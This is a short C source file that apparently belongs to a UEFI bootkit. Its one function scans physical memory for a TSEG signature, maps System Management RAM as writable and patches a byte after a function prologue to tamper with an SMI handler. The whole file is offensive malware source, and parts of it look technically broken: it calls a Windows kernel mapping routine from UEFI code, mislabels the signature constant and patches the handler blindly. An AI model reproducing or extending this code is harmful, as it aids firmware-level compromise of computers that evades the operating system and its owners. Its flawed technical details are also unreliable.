#include "PatchSMI.h"
#include "BootkitDefs.h"
#include "../Shared/EFIWrappers.h"
#include "../Shared/MemTools.h"

#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>

#define TSEG_SIGNATURE 0x54455347 // "TSG" (Intel TSEG)

EFI_STATUS LocateAndPatchSMIHandler(VOID) {
    EFI_PHYSICAL_ADDRESS SmramStart = 0;
    UINT64 SmramSize = 0x20000; // 128KB for SMM
    VOID* SmramMapped = NULL;

    for (EFI_PHYSICAL_ADDRESS Addr = 0xA0000; Addr < 0x1000000; Addr += 0x1000) {
        VOID* Test = MmMapIoSpace(Addr, 0x1000, FALSE);
        if (!Test) continue;

        if (*(UINT32*)Test == TSEG_SIGNATURE) {
            SmramStart = Addr;
            break;
        }
    }

    if (!SmramStart) {
        return EFI_NOT_FOUND;
    }

    SmramMapped = MmMapIoSpace(SmramStart, SmramSize, TRUE);
    if (!SmramMapped) {
        return EFI_ACCESS_DENIED;
    }

    UINT8* Handler = (UINT8*)SmramMapped;

    for (UINTN i = 0; i < SmramSize - 4; i++) {
        if (Handler[i] == 0x55 && Handler[i+1] == 0x8B && Handler[i+2] == 0xEC) {

            Handler[i + 3] = 0x90; 
            break;
        }
    }

    return EFI_SUCCESS;
}
